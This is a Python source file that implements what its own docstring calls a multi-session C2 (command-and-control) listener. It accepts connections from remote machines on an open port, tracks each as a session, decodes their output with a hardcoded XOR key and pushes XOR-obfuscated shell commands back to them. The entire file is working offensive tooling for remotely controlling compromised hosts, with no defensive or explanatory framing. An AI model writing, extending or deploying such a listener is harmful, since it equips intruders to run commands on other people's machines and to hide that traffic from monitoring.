import socket
import threading

class CommandHandlerEngine(threading.Thread):
    """Professional Multi-Session Asynchronous C2 Listener with XOR Encryption"""
    def __init__(self, port, callback=None, colors=None):
        super().__init__(daemon=True)
        self.port = port
        self.callback = callback
        self.server = None
        self.sessions = [] 
        self.key = b"OMNI_XOR_KEY_2024"
        self.colors = colors or {
            "accent_blue": "#0000FF",
            "critical": "#FF0000"
        }

    def _xor(self, data):
        return bytes([b ^ self.key[i % len(self.key)] for i, b in enumerate(data)])

    def run(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind(("0.0.0.0", self.port))
            self.server.listen(10)
            if self.callback: self.callback(f"C2_CORE: Initialized on port {self.port}. Awaiting encrypted links...")
            
            while True:
                client, addr = self.server.accept()
                sid = len(self.sessions)
                self.sessions.append({"socket": client, "addr": addr, "active": True})
                if self.callback: self.callback(f"LINK_ESTABLISHED [SID {sid}]: {addr[0]}", self.colors.get("accent_blue"))
                
                def _io_loop(c, s_id):
                    while True:
                        try:
                            raw = c.recv(8192)
                            if not raw: break
                            dec = self._xor(raw).decode(errors='ignore').strip()
                            if self.callback: self.callback(f"[SID {s_id}] << {dec}")
                        except: break
                    self.sessions[s_id]["active"] = False
                    if self.callback: self.callback(f"LINK_LOST [SID {s_id}]")

                threading.Thread(target=_io_loop, args=(client, sid), daemon=True).start()
        except Exception as e:
            if self.callback: self.callback(f"C2_FATAL: {e}", self.colors.get("critical"))
        finally:
            if self.server: self.server.close()

    def send_cmd(self, cmd, sid=0):
        if sid < len(self.sessions) and self.sessions[sid]["active"]:
            try:
                enc = self._xor(f"{cmd}\n".encode())
                self.sessions[sid]["socket"].send(enc)
                return True
            except: pass
        return False
